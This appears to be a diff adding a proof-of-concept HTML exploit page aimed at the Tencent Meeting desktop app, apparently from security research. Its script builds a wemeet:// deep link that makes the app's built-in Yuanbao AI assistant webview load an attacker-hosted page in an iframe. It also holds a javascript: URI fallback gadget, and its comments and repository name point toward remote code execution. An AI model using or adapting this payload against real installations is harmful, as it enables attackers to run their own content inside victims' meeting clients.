@@ -1,0 +1,20 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-OK</title></head>
+<body><h1>WM-POC-P38</h1>
+<script>
+document.title='P38L-START';
+var inner='https://gitwhs.github.io/wm-poc-rce/probe38inner.html';
+var official='https://meeting.tencent.com/v2/webview/keep-app-alive';
+/* Path A: AskYuanbao extras.url = attacker HTTPS (no javascript). MAIN process real origin. */
+var askHttps='wemeet://page/yuanbao_ai_assistant/profile_ask_yuanbao?url='+encodeURIComponent(inner);
+/* Path B fallback gadget kept for logs if A blocked: javascript location.replace */
+var jsNav="javascript:(function(){document.title='P38NAV:'+location.host;location.replace('"+inner+"')})()";
+function frame(src, label){
+  document.title=label;
+  var f=document.createElement('iframe');
+  f.src=src;
+  document.body.appendChild(f);
+}
+setTimeout(function(){ frame(askHttps,'P38L-ASKHTTPS'); }, 600);
+</script>
+</body></html>
